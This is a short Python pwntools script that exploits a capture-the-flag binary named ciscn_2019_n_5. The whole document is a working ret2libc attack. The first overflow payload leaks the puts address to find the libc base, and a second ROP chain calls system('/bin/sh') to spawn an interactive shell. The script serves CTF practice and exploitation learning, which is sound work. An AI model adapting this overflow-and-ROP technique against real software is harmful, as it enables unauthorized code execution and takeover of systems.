from pwn import *
#io = gdb.debug('./ciscn_2019_n_5','b *0x40067a')
context.log_level = 'debug'
io = process('./ciscn_2019_n_5')
#io = gdb.debug('./ciscn_2019_n_5','b main')
elf = ELF('./ciscn_2019_n_5')
Lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
padding = 0x20

io.sendlineafter('tell me your name\n',b'1')
payload1 = b'A'*0x28+p64(0x0000000000400713)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])
io.sendlineafter('What do you want to say to me?\n',payload1)
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print('puts_addr ->',hex(puts_addr))
io.sendlineafter('tell me your name\n',b'1')

Liboffset = puts_addr-Lib.sym['puts']
sys_addr = Lib.sym['system']+Liboffset
bin_sh_addr = next(Lib.search(b'/bin/sh'))+Liboffset
payload2 = b'A'*(0x28)+p64(0x0000000000400713)+p64(bin_sh_addr)+p64(0x00000000004004c9)+p64(sys_addr)
io.sendlineafter('What do you want to say to me?\n',payload2)

io.interactive()
